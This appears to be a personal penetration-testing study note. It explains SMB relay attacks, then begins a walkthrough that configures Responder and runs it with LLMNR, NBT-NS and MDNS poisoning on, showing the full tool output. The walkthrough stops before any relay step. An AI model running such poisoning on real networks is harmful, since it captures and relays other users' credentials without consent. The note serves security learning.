
![](assets/Pasted%20image%2020241217203937.png)

# [What is SMB Relay Attack?]()

An **SMB relay attack** is a type of **Man-in-the-Middle (MitM)** attack that exploits the **SMB** protocol. In this attack, an adversary relays SMB authentication requests from a victim to a legitimate server, effectively **impersonating the victim to gain unauthorised access.**

An SMB relay attack is a type of Man-in-the-Middle (MitM) attack that exploits the Server Message Block (SMB) protocol, commonly used in Windows environments for file sharing, printing services, and inter-process communication. In this attack, an adversary relays SMB authentication requests from a victim to a legitimate server, effectively impersonating the victim to gain unauthorised access.

# [How SMB Relay Attacks Work?]()

1. **Intercept SMB Traffic**: The attacker positions themselves between the client (victim) and the server, intercepting SMB traffic.
2. **Relay Authentication**: When the client attempts to authenticate to a malicious SMB server (controlled by the attacker), the attacker captures the credentials (e.g., NTLM challenge/response).
3. **Forward to Legitimate Server**: The attacker forwards the captured credentials to the legitimate server to authenticate as the victim.
4. **Gain Unauthorised Access**: If the server accepts the relayed credentials, the attacker gains access to resources under the victim's permissions.

# [Steps of SMB Relay Attack:]()

## [Responder]()

-  Check if clients are vulnerable to SMB relay attack



- Configure the responder for this attack (turn off SMB and HTTP)

```
sudo nano /etc/responder/Responder.conf
```
![](assets/Pasted%20image%2020241217204838.png)

- Listen for LLMNR request using responder

```
┌─[hexadivine@parrot]─[~]
└──╼ $sudo responder -I wlp0s20f3 -dwPv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlp0s20f3]
    Responder IP               [192.168.0.105]
    Responder IPv6             [fe80::7635:bf9e:3643:497f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6AVN6QJO1Z1]
    Responder Domain Name      [QQVB.LOCAL]
    Responder DCE-RPC Port     [46425]

[+] Listening for events...

```

